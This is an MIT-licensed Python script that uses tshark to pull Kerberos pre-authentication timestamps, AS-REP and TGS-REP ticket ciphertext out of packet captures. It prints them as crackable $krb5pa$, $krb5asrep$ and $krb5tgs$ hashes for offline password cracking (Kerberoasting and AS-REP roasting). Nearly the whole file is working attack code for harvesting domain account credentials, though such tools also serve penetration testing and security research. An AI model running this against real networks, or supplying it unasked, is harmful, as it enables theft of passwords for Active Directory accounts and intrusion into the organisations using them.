"""
MIT License

Copyright (c) 2026 Javier Álvarez

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import subprocess
import functools
from typing import List, Tuple


@functools.lru_cache(maxsize=1)
def _use_legacy_cipher_field() -> bool:
    """Check if tshark uses the legacy generic 'kerberos.cipher' field.

    Wireshark 4.6.0+ replaced the generic 'kerberos.cipher' with context-specific
    field names (e.g. 'kerberos.pA_ENC_TIMESTAMP_cipher',
    'kerberos.encryptedTicketData_cipher', 'kerberos.encryptedKDCREPData_cipher').
    The old generic field still exists in the field registry but no longer gets
    populated during packet dissection, causing empty output.
    """
    try:
        result = subprocess.run(["tshark", "-G", "fields"], capture_output=True, text=True, check=True)
        return "kerberos.pA_ENC_TIMESTAMP_cipher" not in result.stdout
    except subprocess.CalledProcessError:
        return True  # Assume legacy on error


def parse_asreq_packets(pcap_file: str) -> List[Tuple[str, str, str]]:
    legacy = _use_legacy_cipher_field()
    cipher_field = "kerberos.cipher" if legacy else "kerberos.pA_ENC_TIMESTAMP_cipher"

    asreq_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        f"kerberos.msg_type == 10 && kerberos.CNameString && kerberos.realm && {cipher_field}",
        "-T",
        "fields",
        "-e",
        "kerberos.CNameString",
        "-e",
        "kerberos.realm",
        "-e",
        cipher_field,
    ]
    asreq_result = subprocess.run(asreq_cmd, capture_output=True, text=True, check=True)

    asrep_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        "kerberos.msg_type == 11 && kerberos.crealm",
        "-T",
        "fields",
        "-e",
        "kerberos.realm",
    ]
    asrep_result = subprocess.run(asrep_cmd, capture_output=True, text=True, check=True)

    asreq_lines = [l for l in asreq_result.stdout.strip().split("\n") if l]
    asrep_realms = [l.strip() for l in asrep_result.stdout.strip().split("\n") if l]

    parsed_results = []
    for i, line in enumerate(asreq_lines):
        parts = line.split("\t")
        if len(parts) != 3:
            continue
        username, _old_realm, cipher = parts
        new_realm = asrep_realms[i] if i < len(asrep_realms) else _old_realm
        parsed_results.append((username, new_realm, cipher))

    return parsed_results


def parse_asrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str]]:
    legacy = _use_legacy_cipher_field()
    cipher_field = "kerberos.cipher" if legacy else "kerberos.encryptedKDCREPData_cipher"

    tshark_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        f"kerberos.msg_type == 11 && kerberos.CNameString && kerberos.realm && {cipher_field}",
        "-T",
        "fields",
        "-e",
        "kerberos.CNameString",
        "-e",
        "kerberos.realm",
        "-e",
        cipher_field,
    ]

    result = subprocess.run(tshark_cmd, capture_output=True, text=True, check=True)

    parsed_results = []
    for line in result.stdout.strip().split("\n"):
        if line:
            try:
                parts = line.split("\t")
                if len(parts) != 3:
                    continue
                username, domain, cipher = parts
                if legacy:
                    cipher_parts = cipher.split(",")
                    if len(cipher_parts) > 1:
                        session_key_cipher = cipher_parts[1]
                    else:
                        continue
                else:
                    session_key_cipher = cipher
                ticket_checksum = session_key_cipher[:32]
                ticket_enc_data = session_key_cipher[32:]
                parsed_results.append((username, domain, ticket_checksum, ticket_enc_data))
            except:
                continue

    return parsed_results


def parse_tgsrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str, str]]:
    legacy = _use_legacy_cipher_field()
    cipher_field = "kerberos.cipher" if legacy else "kerberos.encryptedTicketData_cipher"

    tshark_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        f"kerberos.msg_type == 13 && kerberos.CNameString && kerberos.realm && kerberos.SNameString && {cipher_field}",
        "-T",
        "fields",
        "-e",
        "kerberos.CNameString",
        "-e",
        "kerberos.realm",
        "-e",
        "kerberos.SNameString",
        "-e",
        cipher_field,
    ]

    result = subprocess.run(tshark_cmd, capture_output=True, text=True, check=True)
    parsed_results = []
    for line in result.stdout.strip().split("\n"):
        if line:
            try:
                parts = line.split("\t")
                if len(parts) != 4:
                    continue
                username, domain, spn, cipher = parts
                spn_parts = spn.split(",")
                if legacy:
                    cipher_parts = cipher.split(",")
                    if len(spn_parts) > 1 and len(cipher_parts) > 1:
                        spn = spn.replace(",", "/")
                        ticket_cipher = cipher_parts[0]
                    else:
                        continue
                else:
                    if len(spn_parts) <= 1:
                        continue
                    spn = spn.replace(",", "/")
                    ticket_cipher = cipher
                ticket_checksum = ticket_cipher[:32]
                ticket_enc_data = ticket_cipher[32:]
                parsed_results.append((username, domain, spn, ticket_checksum, ticket_enc_data))
            except:
                continue

    return parsed_results


def main():
    if len(sys.argv) != 3:
        print("Usage: python roasting.py <pcap_file> <as_req/as_rep/tgs_rep>", file=sys.stderr)
        sys.exit(1)

    pcap_file = sys.argv[1]
    roast_type = sys.argv[2].lower()

    if roast_type == "as_req":
        fields = parse_asreq_packets(pcap_file)
        for username, domain, cipher in fields:
            print(f"$krb5pa$18${username}${domain}${cipher}")

    elif roast_type == "as_rep":
        fields = parse_asrep_packets(pcap_file)
        for username, domain, ticket_checksum, ticket_enc_data in fields:
            print(f"$krb5asrep$23${username}@{domain}:{ticket_checksum}${ticket_enc_data}")

    elif roast_type == "tgs_rep":
        fields = parse_tgsrep_packets(pcap_file)
        for username, domain, spn, ticket_checksum, ticket_enc_data in fields:
            print(f"$krb5tgs$23$*{username}${domain}${spn}*${ticket_checksum}${ticket_enc_data}")

    else:
        print("Error: Second argument must be either 'as_req', 'as_rep' or 'tgs_rep'", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
